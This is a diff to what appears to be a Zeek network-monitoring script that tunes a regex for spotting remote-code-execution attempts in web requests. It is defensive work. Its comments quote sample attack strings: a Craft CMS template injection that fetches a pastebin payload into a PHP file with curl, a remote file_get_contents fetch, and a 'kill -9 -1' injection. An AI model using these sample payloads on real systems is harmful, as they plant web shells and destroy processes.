@@ -65,28 +65,28 @@ export {
 
     const match_rce_pattern =
 
-    /(eval[[:space:]]*\+*\()/i |
+    /(eval[[:space:]]*?\+*?\()/i |
     /(\$_POST\[)/ |
     /(\$_GET\[)/ |
     /(\$_FILES\[)/ |
     /(\$_REQUEST\[)/ |
     /(\<\?php)/i |
-    /(echo[[:space:]]*\+*(\"|\\'|\"))/i |
-    /(exec[[:space:]]*\+*\()/i |
-    /(base64_decode[[:space:]]*\+*\()/i | 
-    /(FromBase64String[[:space:]]*\+*\()/i |
-    /(copy[[:space:]]*\+*\()/i |
-    /(md5[[:space:]]*\+*\()/i |
-    /(system[[:space:]]*\+*\()/i |
-    /(gzinflate[[:space:]]*\+*\()/i |
-    /(die[[:space:]]*\+*\()/i |
-    /(fwrite[[:space:]]*\+*\()/i |
-    /(fopen[[:space:]]*\+*\()/i |
-    /(preg_replace[[:space:]]*\+*\()/i |
-    /(str_replace[[:space:]]*\+*\()/i |
-    /(file_get_contents[[:space:]]*\+*\()/i |
+    /(echo[[:space:]]*?\+*?(\"|\\'|\"))/i |
+    /(exec[[:space:]]*?\+*?\()/i |
+    /(base64_decode[[:space:]]*?\+*?\()/i | 
+    /(FromBase64String[[:space:]]*?\+*?\()/i |
+    /(copy[[:space:]]*?\+*?\()/i |
+    /(md5[[:space:]]*?\+*?\()/i |
+    /(system[[:space:]]*?\+*?\()/i |
+    /(gzinflate[[:space:]]*?\+*?\()/i |
+    /(die[[:space:]]*?\+*?\()/i |
+    /(fwrite[[:space:]]*?\+*?\()/i |
+    /(fopen[[:space:]]*?\+*?\()/i |
+    /(preg_replace[[:space:]]*?\+*?\()/i |
+    /(str_replace[[:space:]]*?\+*?\()/i |
+    /(file_get_contents[[:space:]]*?\+*?\()/i | #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
     /(PHP Obfuscator)/ |
-    # /(\?\>)/ | Legitimate XML Ending
+    # /(\?\>)/ | Too many false positives. Legitimate XML Ending
     # /(\%\>)/ | Too many false positives.
     /(curl[[:space:]]+).*?((-o)|(--output))|(\>)/i | # Example: [#markup]=curl%20https:// . Look for some type of file write.
     /(curl_init[[:space:]]*\()/i |
@@ -101,7 +101,7 @@ export {
     #__FILE__) #Example: <?php define('UztpJp0914',__FILE__);$HwEbwH
     #evaluateDynamicContent # Example: uri={{craft.app.view.evaluateDynamicContent('print(system("curl https://pastebin.com/raw/Tm4k3Ky3 > hank.php"));')}}
     #kill #Example: [#markup]=kill -9 -1;
-    #file_get_contents #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
+    
 
     # Could also look for plaintext sites known for code:
         # pastbin.com 
